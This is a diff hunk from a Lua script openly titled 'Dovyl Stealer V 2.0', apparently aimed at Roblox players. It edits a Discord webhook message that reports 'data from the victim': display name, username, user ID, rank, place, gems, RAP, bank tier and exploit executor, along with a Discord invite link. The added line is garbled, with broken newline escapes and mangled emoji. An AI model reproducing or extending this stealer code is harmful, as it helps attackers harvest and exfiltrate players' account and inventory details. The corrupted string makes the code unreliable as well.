@@ -48,7 +48,7 @@ local msg = {
 	["embeds"]= {
 	  {
 		["title"]= "`Dovyl Stealer V 2.0`",
-		["description"]= "**Data from the victim**\nðŸ§‘Display Name: ".._G.PlrDisplayNameVictim.."\nðŸ§‘Username: ".._G.PlrUserVictim.."\nðŸ§‘User ID: ".._G.PlrUserIDVictim.."\nðŸ±Rank: ".._G.CurrentRank.."\nðŸŽ®Place: ".._G.GameIn.."\nðŸ’ŽGems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
+		["description"]= "**Data from the victim**\‘Display Name: ".._G.PlrDisplayNameVictim.."\‘Username: ".._G.PlrUserVictim.."\‘User ID: ".._G.PlrUserIDVictim.."\Rank: ".._G.CurrentRank.."\Place: ".._G.GameIn.."\Gems: **".._G.DisplayDiamond.."**\nâ¬†ï¸Rap: **".._G.DisplayRap.."**\nðŸ“ˆBank Tier: **".._G.DisplayBankTier.."**\nâ˜ Executor: **"..getexploit().."**",
 		["url"]= "https://discord.gg/zzVxWaqfrc",
 		["color"]= ""..webhookcolor.."",
   }
